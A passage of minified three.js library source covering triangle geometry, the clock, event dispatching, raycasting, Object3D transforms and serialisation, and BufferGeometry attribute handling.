THREE.Vector3,u=this.getLength();for(l.push(c.copy(this.points[0]).clone()),t=1;t<this.points.length;t++){for(o=u.chunks[t]-u.chunks[t-1],s=Math.ceil(e*o/u.total),n=(t-1)/(this.points.length-1),a=t/(this.points.length-1),r=1;s-1>r;r++)i=n+r*(1/s)*(a-n),h=this.getPoint(i),l.push(c.copy(h).clone());l.push(c.copy(this.points[t]).clone())}this.points=l}},THREE.Triangle=function(e,t,r){this.a=void 0!==e?e:new THREE.Vector3,this.b=void 0!==t?t:new THREE.Vector3,this.c=void 0!==r?r:new THREE.Vector3},THREE.Triangle.normal=function(){var e=new THREE.Vector3;return function(t,r,i,n){var a=n||new THREE.Vector3;a.subVectors(i,r),e.subVectors(t,r),a.cross(e);var o=a.lengthSq();return o>0?a.multiplyScalar(1/Math.sqrt(o)):a.set(0,0,0)}}(),THREE.Triangle.barycoordFromPoint=function(){var e=new THREE.Vector3,t=new THREE.Vector3,r=new THREE.Vector3;return function(i,n,a,o,s){e.subVectors(o,n),t.subVectors(a,n),r.subVectors(i,n);var h=e.dot(e),l=e.dot(t),c=e.dot(r),u=t.dot(t),E=t.dot(r),f=h*u-l*l,p=s||new THREE.Vector3;if(0==f)return p.set(-2,-1,-1);var d=1/f,m=(u*c-l*E)*d,T=(h*E-l*c)*d;return p.set(1-m-T,T,m)}}(),THREE.Triangle.containsPoint=function(){var e=new THREE.Vector3;return function(t,r,i,n){var a=THREE.Triangle.barycoordFromPoint(t,r,i,n,e);return a.x>=0&&a.y>=0&&a.x+a.y<=1}}(),THREE.Triangle.prototype={constructor:THREE.Triangle,set:function(e,t,r){return this.a.copy(e),this.b.copy(t),this.c.copy(r),this},setFromPointsAndIndices:function(e,t,r,i){return this.a.copy(e[t]),this.b.copy(e[r]),this.c.copy(e[i]),this},copy:function(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this},area:function(){var e=new THREE.Vector3,t=new THREE.Vector3;return function(){return e.subVectors(this.c,this.b),t.subVectors(this.a,this.b),.5*e.cross(t).length()}}(),midpoint:function(e){var t=e||new THREE.Vector3;return t.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(e){return THREE.Triangle.normal(this.a,this.b,this.c,e)},plane:function(e){var t=e||new THREE.Plane;return t.setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(e,t){return THREE.Triangle.barycoordFromPoint(e,this.a,this.b,this.c,t)},containsPoint:function(e){return THREE.Triangle.containsPoint(e,this.a,this.b,this.c)},equals:function(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)},clone:function(){return(new THREE.Triangle).copy(this)}},THREE.Clock=function(e){this.autoStart=void 0!==e?e:!0,this.startTime=0,this.oldTime=0,this.elapsedTime=0,this.running=!1},THREE.Clock.prototype={constructor:THREE.Clock,start:function(){this.startTime=void 0!==self.performance&&void 0!==self.performance.now?self.performance.now():Date.now(),this.oldTime=this.startTime,this.running=!0},stop:function(){this.getElapsedTime(),this.running=!1},getElapsedTime:function(){return this.getDelta(),this.elapsedTime},getDelta:function(){var e=0;if(this.autoStart&&!this.running&&this.start(),this.running){var t=void 0!==self.performance&&void 0!==self.performance.now?self.performance.now():Date.now();e=.001*(t-this.oldTime),this.oldTime=t,this.elapsedTime+=e}return e}},THREE.EventDispatcher=function(){},THREE.EventDispatcher.prototype={constructor:THREE.EventDispatcher,apply:function(e){e.addEventListener=THREE.EventDispatcher.prototype.addEventListener,e.hasEventListener=THREE.EventDispatcher.prototype.hasEventListener,e.removeEventListener=THREE.EventDispatcher.prototype.removeEventListener,e.dispatchEvent=THREE.EventDispatcher.prototype.dispatchEvent},addEventListener:function(e,t){void 0===this._listeners&&(this._listeners={});var r=this._listeners;void 0===r[e]&&(r[e]=[]),-1===r[e].indexOf(t)&&r[e].push(t)},hasEventListener:function(e,t){if(void 0===this._listeners)return!1;var r=this._listeners;return void 0!==r[e]&&-1!==r[e].indexOf(t)?!0:!1},removeEventListener:function(e,t){if(void 0!==this._listeners){var r=this._listeners,i=r[e];if(void 0!==i){var n=i.indexOf(t);-1!==n&&i.splice(n,1)}}},dispatchEvent:function(e){if(void 0!==this._listeners){var t=this._listeners,r=t[e.type];if(void 0!==r){e.target=this;for(var i=[],n=r.length,a=0;n>a;a++)i[a]=r[a];for(var a=0;n>a;a++)i[a].call(this,e)}}}},function(e){e.Raycaster=function(t,r,i,n){this.ray=new e.Ray(t,r),this.near=i||0,this.far=n||1/0,this.params={Sprite:{},Mesh:{},PointCloud:{threshold:1},LOD:{},Line:{}}};var t=function(e,t){return e.distance-t.distance},r=function(e,t,i,n){if(e.raycast(t,i),n===!0)for(var a=e.children,o=0,s=a.length;s>o;o++)r(a[o],t,i,!0)};e.Raycaster.prototype={constructor:e.Raycaster,precision:1e-4,linePrecision:1,set:function(e,t){this.ray.set(e,t)},setFromCamera:function(t,r){r instanceof e.PerspectiveCamera?(this.ray.origin.copy(r.position),this.ray.direction.set(t.x,t.y,.5).unproject(r).sub(r.position).normalize()):r instanceof e.OrthographicCamera?(this.ray.origin.set(t.x,t.y,-1).unproject(r),this.ray.direction.set(0,0,-1).transformDirection(r.matrixWorld)):e.error("THREE.Raycaster: Unsupported camera type.")},intersectObject:function(e,i){var n=[];return r(e,this,n,i),n.sort(t),n},intersectObjects:function(i,n){var a=[];if(i instanceof Array==!1)return e.warn("THREE.Raycaster.intersectObjects: objects is not an Array."),a;for(var o=0,s=i.length;s>o;o++)r(i[o],this,a,n);return a.sort(t),a}}}(THREE),THREE.Object3D=function(){Object.defineProperty(this,"id",{value:THREE.Object3DIdCount++}),this.uuid=THREE.Math.generateUUID(),this.name="",this.type="Object3D",this.parent=void 0,this.children=[],this.up=THREE.Object3D.DefaultUp.clone();var e=new THREE.Vector3,t=new THREE.Euler,r=new THREE.Quaternion,i=new THREE.Vector3(1,1,1),n=function(){r.setFromEuler(t,!1)},a=function(){t.setFromQuaternion(r,void 0,!1)};t.onChange(n),r.onChange(a),Object.defineProperties(this,{position:{enumerable:!0,value:e},rotation:{enumerable:!0,value:t},quaternion:{enumerable:!0,value:r},scale:{enumerable:!0,value:i}}),this.rotationAutoUpdate=!0,this.matrix=new THREE.Matrix4,this.matrixWorld=new THREE.Matrix4,this.matrixAutoUpdate=!0,this.matrixWorldNeedsUpdate=!1,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.userData={}},THREE.Object3D.DefaultUp=new THREE.Vector3(0,1,0),THREE.Object3D.prototype={constructor:THREE.Object3D,get eulerOrder(){return THREE.warn("THREE.Object3D: .eulerOrder has been moved to .rotation.order."),this.rotation.order},set eulerOrder(e){THREE.warn("THREE.Object3D: .eulerOrder has been moved to .rotation.order."),this.rotation.order=e},get useQuaternion(){THREE.warn("THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.")},set useQuaternion(e){THREE.warn("THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.")},applyMatrix:function(e){this.matrix.multiplyMatrices(e,this.matrix),this.matrix.decompose(this.position,this.quaternion,this.scale)},setRotationFromAxisAngle:function(e,t){this.quaternion.setFromAxisAngle(e,t)},setRotationFromEuler:function(e){this.quaternion.setFromEuler(e,!0)},setRotationFromMatrix:function(e){this.quaternion.setFromRotationMatrix(e)},setRotationFromQuaternion:function(e){this.quaternion.copy(e)},rotateOnAxis:function(){var e=new THREE.Quaternion;return function(t,r){return e.setFromAxisAngle(t,r),this.quaternion.multiply(e),this}}(),rotateX:function(){var e=new THREE.Vector3(1,0,0);return function(t){return this.rotateOnAxis(e,t)}}(),rotateY:function(){var e=new THREE.Vector3(0,1,0);return function(t){return this.rotateOnAxis(e,t)}}(),rotateZ:function(){var e=new THREE.Vector3(0,0,1);return function(t){return this.rotateOnAxis(e,t)}}(),translateOnAxis:function(){var e=new THREE.Vector3;return function(t,r){return e.copy(t).applyQuaternion(this.quaternion),this.position.add(e.multiplyScalar(r)),this}}(),translate:function(e,t){return THREE.warn("THREE.Object3D: .translate() has been removed. Use .translateOnAxis( axis, distance ) instead."),this.translateOnAxis(t,e)},translateX:function(){var e=new THREE.Vector3(1,0,0);return function(t){return this.translateOnAxis(e,t)}}(),translateY:function(){var e=new THREE.Vector3(0,1,0);return function(t){return this.translateOnAxis(e,t)}}(),translateZ:function(){var e=new THREE.Vector3(0,0,1);return function(t){return this.translateOnAxis(e,t)}}(),localToWorld:function(e){return e.applyMatrix4(this.matrixWorld)},worldToLocal:function(){var e=new THREE.Matrix4;return function(t){return t.applyMatrix4(e.getInverse(this.matrixWorld))}}(),lookAt:function(){var e=new THREE.Matrix4;return function(t){e.lookAt(t,this.position,this.up),this.quaternion.setFromRotationMatrix(e)}}(),add:function(e){if(arguments.length>1){for(var t=0;t<arguments.length;t++)this.add(arguments[t]);return this}return e===this?(THREE.error("THREE.Object3D.add: object can't be added as a child of itself.",e),this):(e instanceof THREE.Object3D?(void 0!==e.parent&&e.parent.remove(e),e.parent=this,e.dispatchEvent({type:"added"}),this.children.push(e)):THREE.error("THREE.Object3D.add: object not an instance of THREE.Object3D.",e),this)},remove:function(e){if(arguments.length>1)for(var t=0;t<arguments.length;t++)this.remove(arguments[t]);var r=this.children.indexOf(e);-1!==r&&(e.parent=void 0,e.dispatchEvent({type:"removed"}),this.children.splice(r,1))},getChildByName:function(e){return THREE.warn("THREE.Object3D: .getChildByName() has been renamed to .getObjectByName()."),this.getObjectByName(e)},getObjectById:function(e){return this.getObjectByProperty("id",e)},getObjectByName:function(e){return this.getObjectByProperty("name",e)},getObjectByProperty:function(e,t){if(this[e]===t)return this;for(var r=0,i=this.children.length;i>r;r++){var n=this.children[r],a=n.getObjectByProperty(e,t);if(void 0!==a)return a}return void 0},getWorldPosition:function(e){var t=e||new THREE.Vector3;return this.updateMatrixWorld(!0),t.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:function(){var e=new THREE.Vector3,t=new THREE.Vector3;return function(r){var i=r||new THREE.Quaternion;return this.updateMatrixWorld(!0),this.matrixWorld.decompose(e,i,t),i}}(),getWorldRotation:function(){var e=new THREE.Quaternion;return function(t){var r=t||new THREE.Euler;return this.getWorldQuaternion(e),r.setFromQuaternion(e,this.rotation.order,!1)}}(),getWorldScale:function(){var e=new THREE.Vector3,t=new THREE.Quaternion;return function(r){var i=r||new THREE.Vector3;return this.updateMatrixWorld(!0),this.matrixWorld.decompose(e,t,i),i}}(),getWorldDirection:function(){var e=new THREE.Quaternion;return function(t){var r=t||new THREE.Vector3;return this.getWorldQuaternion(e),r.set(0,0,1).applyQuaternion(e)}}(),raycast:function(){},traverse:function(e){e(this);for(var t=0,r=this.children.length;r>t;t++)this.children[t].traverse(e)},traverseVisible:function(e){if(this.visible!==!1){e(this);for(var t=0,r=this.children.length;r>t;t++)this.children[t].traverseVisible(e)}},traverseAncestors:function(e){this.parent&&(e(this.parent),this.parent.traverseAncestors(e))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(e){this.matrixAutoUpdate===!0&&this.updateMatrix(),(this.matrixWorldNeedsUpdate===!0||e===!0)&&(void 0===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorldNeedsUpdate=!1,e=!0);for(var t=0,r=this.children.length;r>t;t++)this.children[t].updateMatrixWorld(e)},toJSON:function(){var e={metadata:{version:4.3,type:"Object",generator:"ObjectExporter"}},t={},r=function(r){if(void 0===e.geometries&&(e.geometries=[]),void 0===t[r.uuid]){var i=r.toJSON();delete i.metadata,t[r.uuid]=i,e.geometries.push(i)}return r.uuid},i={},n=function(t){if(void 0===e.materials&&(e.materials=[]),void 0===i[t.uuid]){var r=t.toJSON();delete r.metadata,i[t.uuid]=r,e.materials.push(r)}return t.uuid},a=function(e){var t={};if(t.uuid=e.uuid,t.type=e.type,""!==e.name&&(t.name=e.name),"{}"!==JSON.stringify(e.userData)&&(t.userData=e.userData),e.visible!==!0&&(t.visible=e.visible),e instanceof THREE.PerspectiveCamera?(t.fov=e.fov,t.aspect=e.aspect,t.near=e.near,t.far=e.far):e instanceof THREE.OrthographicCamera?(t.left=e.left,t.right=e.right,t.top=e.top,t.bottom=e.bottom,t.near=e.near,t.far=e.far):e instanceof THREE.AmbientLight?t.color=e.color.getHex():e instanceof THREE.DirectionalLight?(t.color=e.color.getHex(),t.intensity=e.intensity):e instanceof THREE.PointLight?(t.color=e.color.getHex(),t.intensity=e.intensity,t.distance=e.distance,t.decay=e.decay):e instanceof THREE.SpotLight?(t.color=e.color.getHex(),t.intensity=e.intensity,t.distance=e.distance,t.angle=e.angle,t.exponent=e.exponent,t.decay=e.decay):e instanceof THREE.HemisphereLight?(t.color=e.color.getHex(),t.groundColor=e.groundColor.getHex()):e instanceof THREE.Mesh||e instanceof THREE.Line||e instanceof THREE.PointCloud?(t.geometry=r(e.geometry),t.material=n(e.material),e instanceof THREE.Line&&(t.mode=e.mode)):e instanceof THREE.Sprite&&(t.material=n(e.material)),t.matrix=e.matrix.toArray(),e.children.length>0){t.children=[];for(var i=0;i<e.children.length;i++)t.children.push(a(e.children[i]))}return t};return e.object=a(this),e},clone:function(e,t){if(void 0===e&&(e=new THREE.Object3D),void 0===t&&(t=!0),e.name=this.name,e.up.copy(this.up),e.position.copy(this.position),e.quaternion.copy(this.quaternion),e.scale.copy(this.scale),e.rotationAutoUpdate=this.rotationAutoUpdate,e.matrix.copy(this.matrix),e.matrixWorld.copy(this.matrixWorld),e.matrixAutoUpdate=this.matrixAutoUpdate,e.matrixWorldNeedsUpdate=this.matrixWorldNeedsUpdate,e.visible=this.visible,e.castShadow=this.castShadow,e.receiveShadow=this.receiveShadow,e.frustumCulled=this.frustumCulled,e.userData=JSON.parse(JSON.stringify(this.userData)),t===!0)for(var r=0;r<this.children.length;r++){var i=this.children[r];e.add(i.clone())}return e}},THREE.EventDispatcher.prototype.apply(THREE.Object3D.prototype),THREE.Object3DIdCount=0,THREE.Face3=function(e,t,r,i,n,a){this.a=e,this.b=t,this.c=r,this.normal=i instanceof THREE.Vector3?i:new THREE.Vector3,this.vertexNormals=i instanceof Array?i:[],this.color=n instanceof THREE.Color?n:new THREE.Color,this.vertexColors=n instanceof Array?n:[],this.vertexTangents=[],this.materialIndex=void 0!==a?a:0},THREE.Face3.prototype={constructor:THREE.Face3,clone:function(){var e=new THREE.Face3(this.a,this.b,this.c);e.normal.copy(this.normal),e.color.copy(this.color),e.materialIndex=this.materialIndex;for(var t=0,r=this.vertexNormals.length;r>t;t++)e.vertexNormals[t]=this.vertexNormals[t].clone();for(var t=0,r=this.vertexColors.length;r>t;t++)e.vertexColors[t]=this.vertexColors[t].clone();for(var t=0,r=this.vertexTangents.length;r>t;t++)e.vertexTangents[t]=this.vertexTangents[t].clone();return e}},THREE.Face4=function(e,t,r,i,n,a,o){return THREE.warn("THREE.Face4 has been removed. A THREE.Face3 will be created instead."),new THREE.Face3(e,t,r,n,a,o)},THREE.BufferAttribute=function(e,t){this.array=e,this.itemSize=t,this.needsUpdate=!1},THREE.BufferAttribute.prototype={constructor:THREE.BufferAttribute,get length(){return this.array.length},copyAt:function(e,t,r){e*=this.itemSize,r*=t.itemSize;for(var i=0,n=this.itemSize;n>i;i++)this.array[e+i]=t.array[r+i];return this},set:function(e,t){return void 0===t&&(t=0),this.array.set(e,t),this},setX:function(e,t){return this.array[e*this.itemSize]=t,this},setY:function(e,t){return this.array[e*this.itemSize+1]=t,this},setZ:function(e,t){return this.array[e*this.itemSize+2]=t,this},setXY:function(e,t,r){return e*=this.itemSize,this.array[e]=t,this.array[e+1]=r,this},setXYZ:function(e,t,r,i){return e*=this.itemSize,this.array[e]=t,this.array[e+1]=r,this.array[e+2]=i,this},setXYZW:function(e,t,r,i,n){return e*=this.itemSize,this.array[e]=t,this.array[e+1]=r,this.array[e+2]=i,this.array[e+3]=n,this},clone:function(){return new THREE.BufferAttribute(new this.array.constructor(this.array),this.itemSize)}},THREE.Int8Attribute=function(e,t){return THREE.warn("THREE.Int8Attribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.Uint8Attribute=function(e,t){return THREE.warn("THREE.Uint8Attribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.Uint8ClampedAttribute=function(e,t){return THREE.warn("THREE.Uint8ClampedAttribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.Int16Attribute=function(e,t){return THREE.warn("THREE.Int16Attribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.Uint16Attribute=function(e,t){return THREE.warn("THREE.Uint16Attribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.Int32Attribute=function(e,t){return THREE.warn("THREE.Int32Attribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.Uint32Attribute=function(e,t){return THREE.warn("THREE.Uint32Attribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.Float32Attribute=function(e,t){return THREE.warn("THREE.Float32Attribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.Float64Attribute=function(e,t){return THREE.warn("THREE.Float64Attribute has been removed. Use THREE.BufferAttribute( array, itemSize ) instead."),new THREE.BufferAttribute(e,t)},THREE.DynamicBufferAttribute=function(e,t){THREE.BufferAttribute.call(this,e,t),this.updateRange={offset:0,count:-1}},THREE.DynamicBufferAttribute.prototype=Object.create(THREE.BufferAttribute.prototype),THREE.DynamicBufferAttribute.prototype.constructor=THREE.DynamicBufferAttribute,THREE.DynamicBufferAttribute.prototype.clone=function(){return new THREE.DynamicBufferAttribute(new this.array.constructor(this.array),this.itemSize)},THREE.BufferGeometry=function(){Object.defineProperty(this,"id",{value:THREE.GeometryIdCount++}),this.uuid=THREE.Math.generateUUID(),this.name="",this.type="BufferGeometry",this.attributes={},this.attributesKeys=[],this.drawcalls=[],this.offsets=this.drawcalls,this.boundingBox=null,this.boundingSphere=null},THREE.BufferGeometry.prototype={constructor:THREE.BufferGeometry,addAttribute:function(e,t){return t instanceof THREE.BufferAttribute==!1?(THREE.warn("THREE.BufferGeometry: .addAttribute() now expects ( name, attribute )."),void(this.attributes[e]={array:arguments[1],itemSize:arguments[2]})):(this.attributes[e]=t,void(this.attributesKeys=Object.keys(this.attributes)))},getAttribute:function(e){return this.attributes[e]},addDrawCall:function(e,t,r){this.drawcalls.push({start:e,count:t,index:void 0!==r?r:0})},applyMatrix:function(e){var t=this.attributes.position;void 0!==t&&(e.applyToVector3Array(t.array),t.needsUpdate=!0);var r=this.attributes.normal;if(void 0!==r){var i=(new THREE.Matrix3).getNormalMatrix(e);i.applyToVector3Array(r.array),r.needsUpdate=!0}null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere()},center:function(){this.computeBoundingBox();var e=this.boundingBox.center().negate();return this.applyMatrix((new THREE.Matrix4).setPosition(e)),e},fromGeometry:function(e,t){t=t||{vertexColors:THREE.NoColors};var r=e.vertices,i=e.faces,n=e.faceVertexUvs,a=t.vertexColors,o=n[0].length>0,s=3==i[0].vertexNormals.length,h=new Float32Array(3*i.length*3);this.addAttribute("position",new THREE.BufferAttribute(h,3));var l=new Float32Array(3*i.length*3);if(this.addAttribute("normal",new THREE.BufferAttribute(l,3)),a!==THREE.NoColors){var c=new Float32Array(3*i.length*3);this.addAttribute("color",new THREE.BufferAttribute(c,3))}if(o===!0){var u=new Float32Array(3*i.length*2);this.addAttribute("uv",new THREE.BufferAttribute(u,2))}for(var E=0,f=0,p=0;E<i.length;E++,f+=6,p+=9){var d=i[E],m=r[d.a],T=r[d.b],g=r[d.c];if(h[p]=m.x,h[p+1]=m.y,h[p+2]=m.z,h[p+3]=T.x,h[p+4]=T.y,h[p+5]=T.z,h[p+6]=g.x,h[p+7]=g.y,h[p+8]=g.z,s===!0){var v=d.vertexNormals[0],R=d.vertexNormals[1],y=d.vertexNormals[2];l[p]=v.x,l[p+1]=v.y,l[p+2]=v.z,l[p+3]=R.x,l[p+4]=R.y,l[p+5]=R.z,l[p+6]=y.x,l[p+7]=y.y,l[p+8]=y.z}else{var H=d.normal;l[p]=H.x,l[p+1]=H.y,l[p+2]=H.z,l[p+3]=H.x,l[p+4]=H.y,l[p+5]=H.z,l[p+6]=H.x,l[p+7]=H.y,l[p+8]=H.z}if(a===THREE.FaceColors){var x=d.color;c[p]=x.r,c[p+1]=x.g,c[p+2]=x.b,c[p+3]=x.r,c[p+4]=x.g,c[p+5]=x.b,c[p+6]=x.r,c[p+7]=x.g,c[p+8]=x.b}else if(a===THREE.VertexColors){var b=d.vertexColors[0],_=d.vertexColors[1],w=d.vertexColors[2];c[p]=b.r,c[p+1]=b.g,c[p+2]=b.b,c[p+3]=_.r,c[p+4]=_.g,c[p+5]=_.b,c[p+6]=w.r,c[p+7]=w.g,c[p+8]=w.b}if(o===!0){var M=n[0][E][0],S=n[0][E][1],A=n[0][E][2];u[f]=M.x,u[f+1]=M.y,u[f+2]=S.x,u[f+3]=S.y,u[f+4]=A.x,u[f+5]=A.y}}return this.computeBoundingSphere(),this},computeBoundingBox:function(){var e=new THREE.Vector3;return function(){null===this.boundingBox&&(this.boundingBox=new THREE.Box3);var t=this.attributes.position.array;if(t){var r=this.boundingBox;r.makeEmpty();for(var i=0,n=t.length;n>i;i+=3)e.set(t[i],t[i+1],t[i+2]),r.expandByPoint(e)}(void 0===t||0===t.length)&&(this.boundingBox.min.set(0,0,0),this.boundingBox.max.set(0,0,0)),(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&THREE.error('THREE.BufferGeometry.computeBoundingBox: Computed min/max have NaN values. The "position" attribute is likely to have NaN values.')}}(),computeBoundingSphere:function(){var e=new THREE.Box3,t=new THREE.Vector3;return function(){null===this.boundingSphere&&(this.boundingSphere=new THREE.Sphere);var r=this.attributes.position.array;if(r){e.makeEmpty();for(var i=this.boundingSphere.center,n=0,a=r.length;a>n;n+=3)t.set(r[n],r[n+1],r[n+2]),e.expandByPoint(t);e.center(i);for(var o=0,n=0,a=r.length;a>n;n+=3)t.set(r[n],r[n+1],r[n+2]),o=Math.max(o,i.distanceToSquared(t));this.boundingSphere.radius=Math.sqrt(o),isNaN(this.boundingSphere.radius)&&THREE.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.')}}}(),computeFaceNormals:function(){},computeVertexNormals:function(){var e=this.attributes;if(e.position){var t=e.position.array;if(void 0===e.normal)this.addAttribute("normal",new THREE.BufferAttribute(new Float32Array(t.length),3));else for(var r=e.normal.array,i=0,n=r.length;n>i;i++)r[i]=0;var a,o,s,r=e.normal.array,h=new THREE.Vector3,l=new THREE.Vector3,c=new THREE.Vector3,u=new THREE.Vector3,E=new THREE.Vector3;if(e.index)for(var f=e.index.array,p=this.offsets.length>0?this.offsets:[{start:0,count:f.length,index:0}],d=0,m=p.length;m>d;++d)for(var T=p[d].start,g=p[d].count,v=p[d].index,i=T,n=T+g;n>i;i+=3)a=3*(v+f[i]),o=3*(v+f[i+1]),s=3*(v+f[i+2]),h.fromArray(t,a),l.fromArray(t,o),c.fromArray(t,s),u.subVectors(c,l),E.subVectors(h,l),u.cross(E),r[a]+=u.x,r[a+1]+=u.y,r[a+2]+=u.z,r[o]+=u.x,r[o+1]+=u.y,r[o+2]+=u.z,r[s]+=u.x,r[s+1]+=u.y,r[s+2]+=u.z;else for(var i=0,n=t.length;n>i;i+=9)h.fromArray(t,i),l.fromArray(t,i+3),c.fromArray(t,i+6),u.subVectors(c,l),E.subVectors(h,l),u.cross(E),r[i]=u.x,r[i+1]=u.y,r[i+2]=u.z,r[i+3]=u.x,r[i+4]=u.y,r[i+5]=u.z,r[i+6]=u.x,r[i+7]=u.y,r[i+8]=u.z;this.normalizeNormals(),e.normal.needsUpdate=!0}},computeTangents:function(){function e(e,t,r){A.fromArray(i,3*e),C.fromArray(i,3*t),L.fromArray(i,3*r),P.fromArray(a,2*e),F.fromArray(a,2*t),U.fromArray(a,2*r),u=C.x-A.x,E=L.x-A.x,f=C.y-A.y,p=L.y-A.y,d=C.z-A.z,m=L.z-A.z,T=F.x-P.x,g=U.x-P.x,v=F.y-P.y,R=U.y-P.y,y=1/(T*R-g*v),B.set((R*u-v*E)*y,(R*f-v*p)*y,(R*d-v*m)*y),D.set((T*E-g*u)*y,(T*p-g*f)*y,(T*m-g*d)*y),h[e].add(B),h[t].add(B),h[r].add(B),l[e].add(D),l[t].add(D),l[r].add(D)}function t(e){X.fromArray(n,3*e),q.copy(X),G=h[e],W.copy(G),W.sub(X.multiplyScalar(X.dot(G))).normalize(),j.crossVectors(q,G),I=j.dot(l[e]),O=0>I?-1:1,s[4*e]=W.x,s[4*e+1]=W.y,s[4*e+2]=W.z,s[4*e+3]=O}if(void 0===this.attributes.index||void 0===this.attributes.position||void 0===this.attributes.normal||void 0===this.attributes.uv)return void THREE.warn("THREE.BufferGeometry: Missing required attributes (index, position, normal or uv) in BufferGeometry.computeTangents()");var r=this.attributes.index.array,i=this.attributes.position.array,n=this.attributes.normal.array,a=this.attributes.uv.array,o=i.length/3;void 0===this.attributes.tangent&&this.addAttribute("tangent",new THREE.BufferAttribute(new Float32Array(4*o),4));for(var s=this.attributes.tangent.array,h=[],l=[],c=0;o>c;c++)h[c]=new THREE.Vector3,l[c]=new THREE.Vector3;var u,E,f,p,d,m,T,g,v,R,y,H,x,b,_,w,M,S,A=new THREE.Vector3,C=new THREE.Vector3,L=new THREE.Vector3,P=new THREE.Vector2,F=new THREE.Vector2,U=new THREE.Vector2,B=new THREE.Vector3,D=new THREE.Vector3;0===this.drawcalls.length&&this.addDrawCall(0,r.length,0);var V=this.drawcalls;for(b=0,_=V.length;_>b;++b){var z=V[b].start,k=V[b].count,N=V[b].index;for(H=z,x=z+k;x>H;H+=3)w=N+r[H],M=N+r[H+1],S=N+r[H+2],e(w,M,S)}var O,G,I,W=new THREE.Vector3,j=new THREE.Vector3,X=new THREE.Vector3,q=new THREE.Vector3;for(b=0,_=V.length;_>b;++b){var z=V[b].start,k=V[b].count,N=V[b].index;for(H=z,x=z+k;x>H;H+=3)w=N+r[H],M=N+r[H+1],S=N+r[H+2],t(w),t(M),t(S)}},computeOffsets:function(e){void 0===e&&(e=65535);for(var t=this.attributes.index.array,r=this.attributes.position.array,i=t.length/3,n=new Uint16Array(t.length),a=0,o=0,s=[{start:0,count:0,index:0}],h=s[0],l=0,c=0,u=new Int32Array(6),E=new Int32Array(r.length),f=new Int32Array(r.length),p=0;p<r.length;p++)E[p]=-1,f[p]=-1;for(var d=0;i>d;d++){c=0;for(var m=0;3>m;m++){var T=t[3*d+m];-1==E[T]?(u[2*m]=T,u[2*m+1]=-1,c++):E[T]<h.index?(u[2*m]=T,u[2*m+1]=-1,l++):(u[2*m]=T,u[2*m+1]=E[T])}var g=o+c;if(g>h.index+e){var v={start:a,count:0,index:o};s.push(v),h=v;for(var R=0;6>R;R+=2){var y=u[R+1];y>-1&&y<h.index&&(u[R+1]=-1)}}for(var R=0;6>R;R+=2){var T=u[R],y=u[R+1];-1===y&&(y=o++),E[T]=y,f[y]=T,n[a++]=y-h.index,h.count++}}return this.reorderBuffers(n,f,o),this.offsets=s,this.drawcalls=s,s},merge:function(e,t){if(e instanceof THREE.BufferGeometry==!1)return void THREE.error("THREE.BufferGeometry.merge(): geometry not an instance of THREE.BufferGeometry.",e);void 0===t&&(t=0);var r=this.attributes;for(var i in r)if(void 0!==e.attributes[i])for(var n=r[i],a=n.array,o=e.attributes[i],s=o.array,h=o.itemSize,l=0,c=h*t;l<s.length;l++,c++)a[c]=s[l];return this},normalizeNormals:function(){for(var e,t,r,i,n=this.attributes.normal.array,a=0,o=n.length;o>a;a+=3)e=n[a],t=n[a+1],r=n[a+2],i=1/Math.sqrt(e*e+t*t+r*r),n[a]*=i,n[a+1]*=i,n[a+2]*=i},reorderBuffers:function(e,t,r){var i={};for(var n in this.attributes)if("index"!=n){var a=this.attributes[n].array;i[n]=new a.constructor(this.attributes[n].itemSize*r)}for(var o=0;r>o;o++){var s=t[o];for(var n in this.attributes)if("index"!=n)for(var h=this.attributes[n].array,l=this.attributes[n].itemSize,c=i[n],u=0;l>u;u++)c[o*l+u]=h[s*l+u]}this.attributes.index.array=e;for(var n in this.attributes)"index"!=n&&(this.attributes[n].array=i[n],this.attributes[n].numItems=this.attributes[n].itemSize*r)},toJSON:function(){var e={metadata:{version:4,type:"BufferGeometry",generator:"BufferGeometryExporter"},uuid:this.uuid,type:this.type,data:{attributes:{}}},t=this.attributes,r=this.offsets,i=this.boundingSphere;
